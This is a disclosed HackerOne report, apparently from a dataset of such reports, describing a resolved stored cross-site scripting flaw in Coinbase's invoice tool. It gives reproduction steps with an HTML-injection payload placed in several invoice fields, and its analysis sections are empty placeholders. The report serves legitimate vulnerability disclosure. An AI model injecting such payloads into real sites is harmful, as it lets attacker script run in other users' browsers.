---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '21034'
original_report_id: '21034'
title: Invoice Details activate JS that filled in
weakness: Cross-site Scripting (XSS) - Generic
team_handle: coinbase
created_at: '2014-07-22T12:11:50.502Z'
disclosed_at: '2015-03-30T00:30:49.375Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 3
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# Invoice Details activate JS that filled in

## Metadata

- HackerOne Report ID: 21034
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: coinbase
- Disclosed At: 2015-03-30T00:30:49.375Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hello security team,

I found XSS on pending invocation details. (Tested on Firefox).
Scenario:
1. Go to https://coinbase.com/merchant_tools?link_type=email_invoice
2. Fill in valid email.
3. Subject; Payment request from "><img src=y onerror=prompt(1)>
4. Total Bitcoin 1 and for order put a "><img src=y onerror=prompt(1)>
5. Description and Customer ID as a "><img src=y onerror=prompt(1)>
6. Send the Invoice.
7. Go to transaction page and click on the pending transaction.
8. XSS will be activate on the total field and form field, mine is  From:
"><img src=y onerror=prompt(1)> (thefishermanhacker@gmail.com)

Attached recording POC.
Best Regards,

Sasi

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
